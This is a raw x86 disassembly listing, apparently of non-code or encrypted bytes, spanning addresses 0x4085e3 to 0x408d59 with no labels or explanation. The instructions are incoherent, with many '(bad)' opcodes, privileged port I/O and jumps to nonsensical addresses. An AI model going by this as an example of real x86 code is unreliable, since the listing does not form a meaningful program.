  4085e3:	add    DWORD PTR [edi+0x29],eax
  4085e6:	repz cmp eax,0xae38516a
  4085ec:	shr    cl,cl
  4085ee:	out    0x71,al
  4085f0:	jno    0x408581
  4085f2:	outs   dx,DWORD PTR ds:[esi]
  4085f3:	shr    BYTE PTR [edx-0x46a4f086],0x5
  4085fa:	sub    al,0x5a
  4085fc:	or     esi,DWORD PTR [edx+0x1f]
  4085ff:	or     bl,BYTE PTR [ebp+ecx*8+0x14068bad]
  408606:	ds in  eax,dx
  408608:	push   esi
  408609:	cmp    ebp,edx
  40860b:	mov    ebx,0xc2c104b4
  408610:	gs mov dl,0x5a
  408613:	xchg   ecx,eax
  408614:	pop    edx
  408616:	retf   0x52c8
  408619:	test   eax,0x5f4a467e
  40861e:	popf   
  40861f:	rcr    BYTE PTR [eax-0x3a],cl
  408622:	pop    es
  408623:	mov    ebx,0x6785f77c
  408628:	nop
  408629:	retw   0xd7a0
  40862d:	es iret 
  40862f:	jae    0x408617
  408631:	repz pop ecx
  408633:	in     eax,0xb4
  408635:	mov    ch,0xd6
  408637:	xchg   edx,eax
  408638:	mov    dh,BYTE PTR es:[ebx-0x3a1bb959]
  40863f:	add    DWORD PTR [edi],ebp
  408641:	cmp    al,0xf7
  408643:	gs push ds
  408645:	js     0x40862b
  408647:	sub    DWORD PTR [esi],ebx
  408649:	jle    0x40863f
  40864b:	mov    DWORD PTR ds:0xb912e327,esp
  408651:	push   0xe355a86c
  408656:	pop    ebp
  408657:	pushf  
  408658:	cdq    
  408659:	stos   DWORD PTR es:[edi],eax
  40865a:	fadd   st(1),st
  40865c:	or     DWORD PTR ds:0x1c183089,esp
  408662:	mov    bl,0x3a
  408664:	sub    ch,BYTE PTR [ebp+0x78]
  408667:	xchg   ebp,eax
  408668:	or     eax,esp
  40866a:	in     eax,0xad
  40866c:	mov    ds:0x797c7aaf,eax
  408671:	aaa    
  408672:	inc    edi
  408673:	lods   eax,DWORD PTR ds:[esi]
  408674:	cld    
  408675:	mov    ecx,0x524c6b10
  40867a:	xchg   esp,eax
  40867b:	in     eax,0x96
  40867d:	push   esp
  40867e:	stos   BYTE PTR es:[edi],al
  40867f:	div    BYTE PTR [edx]
  408681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408682:	xchg   esp,eax
  408683:	pop    eax
  408684:	sub    al,0xb7
  408686:	outs   dx,BYTE PTR ds:[esi]
  408687:	in     eax,0xe8
  408689:	mov    ds:0xae578361,al
  40868e:	jecxz  0x408708
  408690:	push   0x34269130
  408695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408696:	rcl    DWORD PTR [ebx],1
  408698:	pop    ebx
  408699:	sbb    bl,BYTE PTR [edx+0x73]
  40869c:	scas   eax,DWORD PTR es:[edi]
  40869d:	pop    ebp
  40869e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40869f:	pop    ebp
  4086a0:	pop    esp
  4086a1:	jnp    0x408688
  4086a3:	xor    DWORD PTR [ebx],ebp
  4086a5:	jp     0x4086a2
  4086a7:	cmp    ebx,esi
  4086a9:	xlat   BYTE PTR ds:[ebx]
  4086aa:	mov    ds:0x4ab6b5ac,al
  4086af:	mov    cl,0xcd
  4086b1:	jb     0x4086c2
  4086b3:	add    BYTE PTR [ecx+0x6646b25],bl
  4086b9:	cs test esi,esp
  4086bc:	loop   0x408719
  4086be:	mov    cl,BYTE PTR [edi+0x69]
  4086c1:	pop    ss
  4086c2:	sti    
  4086c3:	loop   0x408700
  4086c5:	scas   al,BYTE PTR es:[edi]
  4086c6:	into   
  4086c7:	popa   
  4086c8:	mov    ds:0xfe32aacf,al
  4086cd:	sti    
  4086ce:	(bad)  
  4086cf:	jmp    0x408728
  4086d1:	clc    
  4086d2:	into   
  4086d3:	mov    bh,0xfe
  4086d5:	cwde   
  4086d6:	jle    0x40871f
  4086d8:	shr    ebp,cl
  4086da:	mov    dh,0xc9
  4086dc:	xor    dh,BYTE PTR [edi]
  4086de:	dec    ebx
  4086df:	push   edi
  4086e0:	enter  0x8bb0,0x29
  4086e4:	imul   BYTE PTR [esi+esi*1+0x23]
  4086e8:	push   ecx
  4086e9:	xchg   edx,eax
  4086ea:	in     eax,dx
  4086eb:	push   ecx
  4086ec:	xchg   edi,edx
  4086ee:	mov    edi,0x7ccf1cff
  4086f3:	cmc    
  4086f4:	dec    ebx
  4086f5:	xchg   esp,eax
  4086f6:	gs jo  0x4086dc
  4086f9:	push   ebx
  4086fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086fb:	daa    
  4086fc:	scas   eax,DWORD PTR es:[edi]
  4086fd:	mov    edx,0xd5a55c5e
  408702:	xlat   BYTE PTR ds:[ebx]
  408703:	(bad)  
  408704:	jae    0x4086b3
  408706:	jp     0x4086cc
  408708:	fidiv  DWORD PTR [ecx]
  40870a:	push   es
  40870b:	adc    al,0x33
  40870d:	inc    esi
  40870e:	ret    
  40870f:	mov    DWORD PTR ds:[edx-0x56],ecx
  408713:	inc    ecx
  408714:	inc    ebx
  408715:	inc    eax
  408716:	in     eax,dx
  408717:	jnp    0x4086b1
  408719:	inc    esi
  40871a:	in     eax,dx
  40871b:	mov    BYTE PTR [ecx-0xf106877],dl
  408721:	mov    dl,0x8e
  408723:	sub    eax,0x8bb8006b
  408728:	and    al,0x69
  40872a:	jp     0x40876e
  40872c:	or     dh,BYTE PTR [ecx]
  40872e:	mov    bl,BYTE PTR ds:0x427d649
  408734:	popa   
  408735:	sub    eax,0xb05a6fd7
  40873a:	sub    eax,0x8e5f4316
  40873f:	sub    esp,DWORD PTR [esi]
  408741:	fcom   DWORD PTR [ebx]
  408743:	loope  0x408731
  408745:	sub    ecx,edx
  408747:	lods   al,BYTE PTR ds:[esi]
  408748:	jmp    0xbb44:0xc60089b5
  40874f:	mov    ss,WORD PTR [eax-0xe]
  408752:	push   0x5b
  408754:	adc    ebp,DWORD PTR [eax+0x7ef11122]
  40875a:	adc    edx,DWORD PTR ds:0x302395b3
  408760:	iret   
  408761:	or     eax,0x9932ccd3
  408766:	pop    ecx
  408767:	fimul  WORD PTR es:[edi]
  40876a:	nop
  40876b:	out    0x51,eax
  40876d:	push   edx
  40876e:	nop
  40876f:	push   edi
  408770:	mov    al,ds:0xcdfe3955
  408775:	cwde   
  408776:	jnp    0x4087c5
  408778:	loope  0x408709
  40877a:	fimul  DWORD PTR [edi+0x74]
  40877d:	mov    esi,0xc0d6fce8
  408782:	cmc    
  408783:	stos   DWORD PTR es:[edi],eax
  408784:	xchg   edi,eax
  408785:	js     0x40877c
  408787:	jnp    0x408808
  408789:	retf   0xe7b0
  40878c:	es es int 0xf3
  408790:	jl     0x40879b
  408792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408793:	fwait
  408794:	lahf   
  408795:	cmp    al,0xcf
  408797:	leave  
  408798:	mov    dl,0x8c
  40879a:	xchg   DWORD PTR [edi],ebx
  40879c:	cmp    al,0x7
  40879e:	in     eax,0x1e
  4087a0:	iret   
  4087a1:	xrelease xchg DWORD PTR ds:0xebf8b6d5,edx
  4087a9:	push   eax
  4087aa:	mov    edi,0x68504ad6
  4087af:	fcomp  QWORD PTR [edi+0xd]
  4087b2:	scas   al,BYTE PTR es:[edi]
  4087b3:	std    
  4087b4:	mov    ?,WORD PTR [eax]
  4087b6:	shr    DWORD PTR [eax],0x8c
  4087b9:	pusha  
  4087ba:	adc    al,0x66
  4087bc:	(bad)  
  4087bd:	jo     0x408762
  4087bf:	xchg   DWORD PTR [edx+ebp*4+0x31f0f252],edx
  4087c6:	(bad)  
  4087c7:	push   esp
  4087c8:	test   eax,0xf98961bf
  4087cd:	push   es
  4087ce:	add    ebp,DWORD PTR [eax]
  4087d0:	mov    ecx,0x1ac026cf
  4087d5:	add    dh,ch
  4087d7:	cs dec edi
  4087d9:	dec    eax
  4087da:	sub    DWORD PTR [ebx+0x15],edi
  4087dd:	add    BYTE PTR [eax+0x37],bl
  4087e0:	cmp    BYTE PTR [esi],dl
  4087e2:	jmp    0xefaf8899
  4087e7:	imul   edx,DWORD PTR [eax],0x94094a09
  4087ed:	adc    cl,BYTE PTR [eax-0x54f1ea36]
  4087f3:	jnp    0x4087d9
  4087f5:	cmp    esi,ebp
  4087f7:	call   0xaeea275d
  4087fc:	mov    ch,0xd8
  4087fe:	push   ds
  4087ff:	call   FWORD PTR [esi-0x4b]
  408802:	lods   eax,DWORD PTR ds:[esi]
  408803:	shl    DWORD PTR [esi],0x56
  408806:	pop    ebp
  408807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408808:	push   esi
  408809:	mov    dh,0x79
  40880b:	scas   al,BYTE PTR es:[edi]
  40880c:	or     BYTE PTR [edx+ebx*4-0x23],cl
  408810:	mov    eax,0xb18d86ef
  408815:	xchg   esp,eax
  408816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408817:	and    eax,0x39b30ccf
  40881c:	dec    esp
  40881d:	addr16 out dx,al
  40881f:	jg     0x408807
  408821:	ret    
  408822:	xor    DWORD PTR [ecx-0x2],0xfd594d7d
  408829:	sub    DWORD PTR [edx+0x3eabfbb9],ebx
  40882f:	inc    edi
  408830:	add    al,BYTE PTR [edx+0x54]
  408833:	and    eax,0xedeec2d6
  408838:	sbb    edi,DWORD PTR [ebp+esi*8-0xb930c26]
  40883f:	pop    esp
  408840:	cli    
  408841:	ins    BYTE PTR es:[edi],dx
  408842:	pop    ecx
  408843:	xchg   esi,eax
  408844:	sub    edx,DWORD PTR ds:0xd909f9be
  40884a:	ja     0x4087d3
  40884c:	xchg   DWORD PTR [ebx-0x32],esp
  40884f:	pushf  
  408850:	fisub  DWORD PTR [ecx]
  408852:	fsubrp st(2),st
  408855:	cmp    ebx,edi
  408857:	stc    
  408858:	xor    esi,DWORD PTR [edx-0x53]
  40885b:	jmp    0x4087dd
  40885d:	adc    al,0x7d
  40885f:	pop    edi
  408860:	jne    0x4088c1
  408862:	jno    0x408891
  408864:	push   esi
  408865:	and    BYTE PTR ds:0x59ed5d55,dl
  40886b:	and    eax,DWORD PTR [eax]
  40886d:	mov    al,0x3a
  40886f:	pop    edi
  408870:	jmp    0x9f3ef86a
  408875:	iret   
  408876:	out    0xb5,eax
  408878:	mov    DWORD PTR [ebp+edi*4-0x34],edx
  40887c:	xor    bl,0xcd
  40887f:	(bad)  
  408880:	out    dx,eax
  408881:	inc    esp
  408882:	(bad)  
  408883:	add    BYTE PTR [eax+0x17],dh
  408886:	sub    ebx,ecx
  408888:	repnz popa 
  40888a:	inc    eax
  40888b:	sub    bh,ch
  40888d:	add    BYTE PTR [edi+ebp*4],cl
  408890:	dec    edx
  408891:	mov    ecx,0x270e0ca4
  408896:	sbb    dl,BYTE PTR [edx]
  408898:	inc    ecx
  408899:	mov    ds:0x9244ed24,al
  40889e:	es push 0xffffffd9
  4088a1:	push   cs
  4088a2:	mov    esi,0xf8fcc493
  4088a7:	mov    ss,WORD PTR [esp+edi*4-0x47]
  4088ab:	dec    DWORD PTR [esi+0x65]
  4088ae:	sbb    esp,DWORD PTR [eax-0x510c5890]
  4088b4:	xor    al,BYTE PTR [ebx]
  4088b6:	mov    gs,WORD PTR [eax]
  4088b8:	outs   dx,DWORD PTR ds:[esi]
  4088b9:	jno    0x4088be
  4088bb:	xor    edx,0x12
  4088be:	mov    dl,0xdc
  4088c0:	inc    esi
  4088c1:	loope  0x408903
  4088c3:	xchg   edi,eax
  4088c4:	adc    eax,0x720a1ba8
  4088c9:	push   esp
  4088ca:	(bad)  
  4088cb:	pop    edi
  4088cc:	frstor [edx-0x2c]
  4088cf:	mov    ebx,0x2af5e936
  4088d4:	jae    0x4088f8
  4088d6:	sub    bl,ah
  4088d8:	clc    
  4088d9:	lock xor BYTE PTR [edi],0x5e
  4088dd:	stc    
  4088de:	xor    ebx,DWORD PTR [edx+0x2a]
  4088e1:	scas   eax,DWORD PTR es:[edi]
  4088e2:	sub    DWORD PTR [edi+0x18],edi
  4088e5:	data16 jmp 0x4088be
  4088e8:	cmp    BYTE PTR [eax-0x6b],dl
  4088eb:	shl    BYTE PTR [edi],cl
  4088ed:	inc    ebx
  4088ee:	imul   eax,ecx,0x39e796e1
  4088f4:	addr16 dec edi
  4088f6:	outs   dx,DWORD PTR ds:[esi]
  4088f7:	jae    0x4088da
  4088f9:	int    0x97
  4088fb:	fnstcw WORD PTR [ebx+0x3b096b7d]
  408901:	arpl   ax,bp
  408903:	scas   al,BYTE PTR es:[edi]
  408904:	sub    DWORD PTR [ebx],edi
  408906:	mov    ecx,DWORD PTR [eax+ecx*8]
  408909:	and    eax,0x2009a553
  40890e:	shl    DWORD PTR [eax],1
  408910:	and    al,0x17
  408912:	sub    DWORD PTR [ecx],esi
  408914:	mov    ah,0x5b
  408916:	sub    DWORD PTR [ebp+0x59],esp
  408919:	(bad)  
  40891a:	sub    BYTE PTR [edi+0x73],bh
  40891d:	scas   al,BYTE PTR es:[edi]
  40891e:	ret    
  40891f:	mov    ds:0x4c9628,al
  408924:	and    esp,eax
  408926:	jne    0x408967
  408928:	scas   eax,DWORD PTR es:[edi]
  408929:	loopne 0x4089a8
  40892b:	xchg   ebx,eax
  40892c:	mov    ch,0x13
  40892e:	lock mov cs:0x34387a94,al
  408935:	and    al,0x5b
  408937:	(bad)  
  408939:	int    0x5b
  40893b:	mov    ebx,0x54681c1c
  408940:	mov    ds:0xad0476e8,al
  408945:	dec    esi
  408946:	inc    edx
  408947:	pop    ecx
  408948:	ret    0x666c
  40894b:	enter  0xeb0a,0xd7
  40894f:	in     eax,dx
  408950:	mov    ah,0x54
  408952:	ss mov esi,0x34494df5
  408958:	repz in ax,dx
  40895b:	jb     0x408919
  40895d:	retf   
  40895e:	fiadd  DWORD PTR [ebp+0x5e2f7069]
  408964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408965:	sub    ah,BYTE PTR [edi-0x3a319120]
  40896b:	cmp    esp,ebp
  40896d:	in     eax,dx
  40896e:	inc    esi
  40896f:	jecxz  0x408981
  408971:	ret    0x457d
  408974:	fidivr WORD PTR [eax]
  408976:	imul   eax,DWORD PTR [eiz*2+0x5a047789],0xffffffa6
  40897e:	jae    0x4089aa
  408980:	push   es
  408981:	nop
  408982:	jnp    0x4089cb
  408984:	mov    al,ds:0xe24efe12
  408989:	leave  
  40898a:	mov    DWORD PTR [edx],ebx
  40898c:	push   edi
  40898d:	stos   BYTE PTR es:[edi],al
  40898e:	mov    ch,0xeb
  408990:	adc    BYTE PTR [edi+0x3f],bh
  408993:	ret    0x1819
  408996:	bound  ebx,QWORD PTR [ecx+eax*2]
  408999:	out    0xb3,al
  40899b:	or     edi,ebx
  40899d:	jge    0x40899d
  40899f:	stos   DWORD PTR es:[edi],eax
  4089a0:	hlt    
  4089a1:	sar    BYTE PTR [ecx+esi*1+0x29],cl
  4089a5:	mov    edi,DWORD PTR [edi+0x3f]
  4089a8:	aad    0x31
  4089aa:	lea    esi,[eax+0x82cd35a]
  4089b0:	fild   DWORD PTR [ecx]
  4089b2:	mov    edx,0xc3d30e9d
  4089b7:	jge    0x408967
  4089b9:	pop    edi
  4089ba:	mov    ebx,0x45b868ca
  4089bf:	xchg   edx,eax
  4089c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089c1:	cmc    
  4089c2:	xlat   BYTE PTR ds:[ebx]
  4089c3:	sar    BYTE PTR [edi+ebp*2-0x178e6081],cl
  4089ca:	xor    BYTE PTR [esi+0x46],bh
  4089cd:	dec    ebx
  4089ce:	mov    ebp,0x39e78fe7
  4089d3:	sub    BYTE PTR [ebp+0x461893a5],dh
  4089d9:	mov    ds:0x5be4e551,eax
  4089de:	jp     0x408a3e
  4089e0:	lahf   
  4089e1:	adc    BYTE PTR [ebp+eiz*2-0x7fe35527],dl
  4089e8:	or     eax,eax
  4089ea:	jge    0x408989
  4089ec:	cmp    al,0x74
  4089ee:	or     eax,0xb5884700
  4089f3:	div    BYTE PTR [ecx+ebx*2-0x6a]
  4089f7:	lahf   
  4089f8:	js     0x4089f8
  4089fa:	pop    ebx
  4089fb:	(bad)  
  4089fd:	fwait
  4089fe:	sti    
  4089ff:	jnp    0x408a7c
  408a01:	outs   dx,BYTE PTR ds:[esi]
  408a02:	sbb    eax,0x90422080
  408a07:	test   al,0x84
  408a09:	sbb    edx,edi
  408a0b:	outs   dx,DWORD PTR ds:[esi]
  408a0c:	mov    cl,0xb7
  408a0e:	scas   eax,DWORD PTR es:[edi]
  408a0f:	dec    ecx
  408a10:	xchg   ebp,eax
  408a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a12:	fisttp WORD PTR [edi-0x28]
  408a15:	fsubr  QWORD PTR [ebx+edx*2+0x6a]
  408a19:	mov    eax,0xc6605bbd
  408a1e:	add    eax,0x19434e59
  408a23:	(bad)  
  408a24:	push   edx
  408a25:	loop   0x4089cf
  408a27:	retf   
  408a28:	ins    BYTE PTR es:[edi],dx
  408a29:	jp     0x408a15
  408a2b:	sub    eax,0x8af736de
  408a30:	imul   eax,DWORD PTR [ebx-0x15],0xffffffb3
  408a34:	lods   al,BYTE PTR ds:[esi]
  408a35:	aam    0x98
  408a37:	shl    BYTE PTR [ebp-0x3b],1
  408a3a:	cmp    DWORD PTR [edi+0x2c],0x51
  408a3e:	mov    esi,DWORD PTR [ebp-0x323a09d5]
  408a44:	mov    bh,0xc1
  408a46:	or     BYTE PTR [edx+0x4583751c],ch
  408a4c:	mov    eax,0x7585f431
  408a51:	jle    0x4089d3
  408a53:	test   eax,0x4c133261
  408a58:	xor    ecx,eax
  408a5a:	jae    0x408a3d
  408a5c:	xor    ah,al
  408a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a5f:	pop    es
  408a60:	sbb    eax,0xe7638922
  408a66:	int    0xf4
  408a68:	xor    DWORD PTR [eax+0x45],0xffffffbb
  408a6c:	jp     0x408aed
  408a6e:	cld    
  408a6f:	mov    BYTE PTR [ebp-0x67],ah
  408a72:	repz retf 0xcf4b
  408a76:	and    ebp,ecx
  408a78:	cwde   
  408a79:	dec    esi
  408a7a:	xor    DWORD PTR [bp+si+0x572c],0x29
  408a80:	dec    ecx
  408a81:	lods   eax,DWORD PTR ds:[esi]
  408a82:	xchg   edi,eax
  408a83:	pop    DWORD PTR [ecx]
  408a85:	mov    al,ds:0x924f4b39
  408a8a:	and    al,0x2e
  408a8c:	out    0xbe,eax
  408a8e:	sub    BYTE PTR [eax-0x18b3d8b4],bl
  408a94:	jae    0x408a90
  408a96:	sub    dh,BYTE PTR [ecx-0x11]
  408a99:	mov    edx,0x57cde0a1
  408a9e:	mov    eax,0x3162b184
  408aa3:	fsubr  DWORD PTR [eax]
  408aa5:	test   BYTE PTR [ecx+0x6e83d184],0x7e
  408aac:	inc    esp
  408aad:	adc    DWORD PTR [edx+0x5],0xffffffad
  408ab1:	push   esi
  408ab2:	stos   DWORD PTR es:[edi],eax
  408ab3:	retf   0x5801
  408ab6:	xchg   ebp,eax
  408ab7:	in     al,dx
  408ab8:	push   ebx
  408ab9:	adc    al,0x5
  408abb:	jnp    0x408b38
  408abd:	jnp    0x408b0a
  408abf:	pusha  
  408ac0:	add    eax,0xbf9bfabc
  408ac5:	stc    
  408ac6:	fwait
  408ac7:	dec    ebx
  408ac8:	jbe    0x408a8b
  408aca:	cmp    edx,DWORD PTR [ecx-0x5dbbffcb]
  408ad0:	retf   
  408ad1:	repnz sub al,0xf0
  408ad4:	repz push ss
  408ad6:	(bad)  
  408ad7:	stos   BYTE PTR es:[edi],al
  408ad8:	sar    edx,1
  408ada:	scas   eax,DWORD PTR es:[edi]
  408adb:	imul   ebp,DWORD PTR [ebp+0x1f2d5a77],0xffffffe2
  408ae2:	mov    edx,DWORD PTR [eax+ecx*2]
  408ae5:	clc    
  408ae6:	or     al,al
  408ae8:	lea    ebx,[ebx+0x454ac9b7]
  408aee:	call   0xb0e1:0x84edda0a
  408af5:	or     eax,0xb2028a08
  408afa:	mov    ecx,0xcbb42f26
  408aff:	adc    BYTE PTR [ecx+esi*2-0x7cb4f051],dh
  408b06:	outs   dx,BYTE PTR ds:[esi]
  408b07:	push   0x12
  408b09:	shl    edi,cl
  408b0b:	mov    ebx,0xb837ed8d
  408b10:	test   DWORD PTR [edx-0x78],eax
  408b13:	inc    eax
  408b14:	mov    eax,ds:0x26c2a19
  408b19:	inc    edi
  408b1a:	jl     0x408aa9
  408b1c:	mov    eax,0xdd75b35
  408b21:	push   edi
  408b22:	inc    ebp
  408b23:	xchg   esi,eax
  408b24:	cdq    
  408b25:	dec    edx
  408b26:	mov    BYTE PTR [eax+ebp*8],al
  408b29:	shl    BYTE PTR [ebp-0x3e5e78fb],cl
  408b2f:	pop    ecx
  408b30:	out    dx,al
  408b31:	sahf   
  408b32:	mov    ecx,0x2dee2ed4
  408b37:	inc    esp
  408b38:	cmp    eax,0x9e53581c
  408b3d:	jo     0x408b05
  408b3f:	inc    esi
  408b40:	cwde   
  408b41:	out    dx,eax
  408b42:	outs   dx,BYTE PTR ds:[esi]
  408b43:	mov    ds:0xaf1bc975,al
  408b48:	cmp    al,0x4f
  408b4a:	bound  ecx,QWORD PTR [edi]
  408b4c:	sbb    DWORD PTR [esi+ecx*1+0x29],ebp
  408b50:	mov    al,dl
  408b52:	aas    
  408b53:	mov    dh,0xa8
  408b55:	jge    0x408b39
  408b57:	ins    DWORD PTR es:[edi],dx
  408b58:	int    0xef
  408b5a:	mov    eax,ds:0xc1660dc7
  408b5f:	pusha  
  408b60:	xor    al,ah
  408b62:	xchg   ebp,eax
  408b63:	push   edi
  408b64:	ffreep st(0)
  408b66:	fadd   DWORD PTR [esp+eax*2+0x4d9dd9b9]
  408b6d:	push   eax
  408b6e:	enter  0x7dc6,0xad
  408b72:	retf   0x8841
  408b75:	stos   DWORD PTR es:[edi],eax
  408b76:	or     edx,DWORD PTR [ebx]
  408b78:	jns    0x408bdb
  408b7a:	cmp    al,0xf5
  408b7c:	scas   eax,DWORD PTR es:[edi]
  408b7d:	out    0x1b,al
  408b7f:	lock ret 
  408b81:	xchg   DWORD PTR [ebp+0x56554836],ecx
  408b87:	push   cs
  408b88:	mov    edi,0x3eb6dcea
  408b8d:	inc    edi
  408b8e:	mov    al,ds:0x2e1c51f3
  408b93:	mov    cl,0x17
  408b95:	loopne 0x408b69
  408b97:	mov    ebp,0xcbbdd6d5
  408b9c:	jg     0x408b6f
  408b9e:	add    BYTE PTR [eax+0x16],dl
  408ba1:	inc    ebp
  408ba2:	pop    es
  408ba3:	cmp    BYTE PTR [ecx],ch
  408ba5:	test   al,bh
  408ba7:	xchg   esp,eax
  408ba8:	mov    ch,0xf6
  408baa:	outs   dx,DWORD PTR ds:[esi]
  408bab:	sbb    ah,BYTE PTR [ebx+0x3e]
  408bae:	lods   al,BYTE PTR gs:[esi]
  408bb0:	sbb    eax,0xb3d54f59
  408bb5:	sub    al,0x27
  408bb7:	iret   
  408bb8:	repz fisub DWORD PTR [eax]
  408bbb:	and    BYTE PTR [ebx],cl
  408bbd:	dec    eax
  408bbe:	dec    edi
  408bbf:	shr    DWORD PTR [esi-0x23],cl
  408bc2:	fcmovb st,st(5)
  408bc4:	rol    BYTE PTR [esi+0x29],cl
  408bc7:	inc    ecx
  408bc8:	stos   DWORD PTR es:[edi],eax
  408bc9:	and    eax,0x5413f419
  408bce:	mov    ds:0xe335cd98,al
  408bd3:	jno    0x408b96
  408bd5:	fs scas al,BYTE PTR es:[edi]
  408bd7:	shl    esi,1
  408bd9:	outs   dx,BYTE PTR ds:[esi]
  408bda:	aam    0x3d
  408bdc:	ds jae 0x408b92
  408bdf:	imul   esi,ecx,0x4a
  408be2:	pop    ebx
  408be3:	sub    DWORD PTR [ebx+0x0],esp
  408be6:	test   DWORD PTR ds:0x3cedddc7,edx
  408bec:	dec    ebx
  408bed:	mov    ?,WORD PTR gs:[eax]
  408bf0:	lods   al,BYTE PTR cs:[esi]
  408bf2:	adc    eax,0x82809b60
  408bf7:	xor    eax,DWORD PTR [ebx]
  408bf9:	lods   al,BYTE PTR ds:[esi]
  408bfa:	inc    ecx
  408bfb:	imul   ecx,DWORD PTR [ecx+0x51],0xffffffba
  408bff:	jno    0x408c02
  408c01:	and    DWORD PTR [eax+ebx*4],edx
  408c04:	jnp    0x408c06
  408c06:	dec    eax
  408c07:	xchg   ebx,eax
  408c08:	test   DWORD PTR ds:0xd363384c,ebx
  408c0e:	(bad)  
  408c10:	push   0x29aa5b58
  408c15:	mov    edi,0x7fefd5e1
  408c1a:	mov    edi,DWORD PTR [edx+esi*2-0x6f]
  408c1e:	int    0x61
  408c20:	scas   eax,DWORD PTR es:[edi]
  408c21:	(bad)  
  408c22:	repz fisttp WORD PTR [ebp-0x17]
  408c26:	jecxz  0x408c11
  408c28:	mov    bh,0x42
  408c2a:	(bad)
  408c2e:	fucomi st,st(5)
  408c30:	mov    dl,0xbf
  408c32:	mov    edi,0xbdaf2bcf
  408c37:	lds    ebp,FWORD PTR [eax-0x19]
  408c3a:	and    DWORD PTR [edx],edi
  408c3c:	fnstsw WORD PTR [esi]
  408c3e:	push   edx
  408c3f:	sub    al,BYTE PTR [edx+eiz*4]
  408c42:	call   0xee7:0xab34407f
  408c49:	bound  esp,QWORD PTR [ebx]
  408c4b:	jo     0x408c58
  408c4d:	aam    0x3f
  408c4f:	xor    BYTE PTR [ecx],al
  408c51:	ins    DWORD PTR es:[edi],dx
  408c52:	cmp    eax,0xd19a9408
  408c57:	mov    DWORD PTR [ecx],eax
  408c59:	push   edx
  408c5a:	sub    DWORD PTR [edi+eax*1-0x7f66aa50],ecx
  408c61:	pop    edx
  408c62:	jmp    0x408c09
  408c64:	cdq    
  408c65:	test   BYTE PTR [ebp-0x621ffe54],bh
  408c6b:	dec    eax
  408c6c:	xchg   esi,eax
  408c6d:	gs daa 
  408c6f:	add    eax,0xbf820cfc
  408c74:	add    dl,ah
  408c76:	jno    0x408ce5
  408c78:	hlt    
  408c79:	pop    es
  408c7a:	lods   al,BYTE PTR ds:[esi]
  408c7b:	mov    ch,0xf
  408c7d:	pop    ebx
  408c7e:	imul   eax,DWORD PTR [edi],0xffffffd6
  408c81:	pop    edx
  408c82:	xchg   edi,eax
  408c83:	cdq    
  408c84:	(bad)
  408c87:	xor    ebx,DWORD PTR [ebx+0x24c5814e]
  408c8d:	and    ch,dl
  408c8f:	dec    ebx
  408c90:	xchg   edx,eax
  408c91:	adc    ah,BYTE PTR [ebx+0x34]
  408c94:	out    0xdf,eax
  408c96:	mov    edx,0x920fb581
  408c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c9c:	shr    BYTE PTR [ecx-0x5],1
  408c9f:	pop    ecx
  408ca0:	pusha  
  408ca1:	cli    
  408ca2:	sub    eax,0x3e32d2ca
  408ca7:	sub    al,0x19
  408ca9:	dec    edi
  408caa:	dec    edx
  408cab:	mov    ah,0x6e
  408cad:	div    BYTE PTR [esi+0x8f82521]
  408cb3:	pusha  
  408cb4:	mov    al,0x96
  408cb6:	push   0x66
  408cb8:	lahf   
  408cb9:	and    eax,0xf1255e25
  408cbe:	stc    
  408cbf:	fwait
  408cc0:	out    0x8c,eax
  408cc2:	push   es
  408cc3:	push   es
  408cc4:	sub    eax,0x7de37bf9
  408cc9:	dec    ebp
  408cca:	push   eax
  408ccb:	icebp  
  408ccc:	fisttp DWORD PTR [ebp+ebp*4+0x142eb2ef]
  408cd3:	pop    eax
  408cd4:	push   0x4b
  408cd6:	xchg   esi,eax
  408cd7:	sbb    DWORD PTR [esi+0x73],esp
  408cda:	shl    ecx,0xcc
  408cdd:	test   DWORD PTR [edi+eiz*8],eax
  408ce0:	mov    ecx,0x2690171b
  408ce5:	cs (bad) 
  408ce7:	fisub  WORD PTR [ecx]
  408ce9:	gs jecxz 0x408d22
  408cec:	std    
  408ced:	lods   eax,DWORD PTR ds:[esi]
  408cee:	sbb    eax,0x1478705
  408cf3:	ret    
  408cf4:	aad    0x8b
  408cf6:	scas   eax,DWORD PTR es:[edi]
  408cf7:	xor    DWORD PTR [esi+0x4f6706fd],edi
  408cfd:	outs   dx,DWORD PTR ds:[esi]
  408cfe:	push   esi
  408cff:	cmp    eax,0x3be5007f
  408d04:	sub    edx,edi
  408d06:	stos   BYTE PTR es:[edi],al
  408d07:	std    
  408d08:	outs   dx,BYTE PTR ds:[esi]
  408d09:	repnz iret 
  408d0b:	push   cs
  408d0c:	repz jns 0x408cd5
  408d0f:	xlat   BYTE PTR ds:[ebx]
  408d10:	lahf   
  408d11:	jge    0x408d14
  408d13:	stos   DWORD PTR es:[edi],eax
  408d14:	cli    
  408d15:	pushf  
  408d16:	cmp    BYTE PTR [ecx-0x6a],bh
  408d19:	(bad)  
  408d1a:	pusha  
  408d1b:	dec    eax
  408d1c:	(bad)  
  408d1e:	pusha  
  408d1f:	lods   eax,DWORD PTR ds:[esi]
  408d20:	test   al,0xc8
  408d22:	rcr    BYTE PTR [ebp-0x569f49f4],cl
  408d28:	pop    ecx
  408d29:	jg     0x408d0e
  408d2b:	ror    DWORD PTR [ecx+ecx*4-0x49a8017],0x17
  408d33:	into   
  408d34:	inc    edi
  408d35:	bound  esi,QWORD PTR [ebp-0x3a]
  408d38:	out    0xb0,al
  408d3a:	(bad)  
  408d3b:	hlt    
  408d3c:	or     ebp,DWORD PTR [esi+0x278efd06]
  408d42:	or     BYTE PTR [ebp+0x1335652],dl
  408d48:	xor    eax,0x16e0c000
  408d4d:	cmp    al,0xbd
  408d4f:	scas   eax,DWORD PTR es:[edi]
  408d50:	repnz out 0x1e,eax
  408d53:	add    BYTE PTR [edx-0x3f4c4d4],dh
  408d59:	cmp    al,0xf0
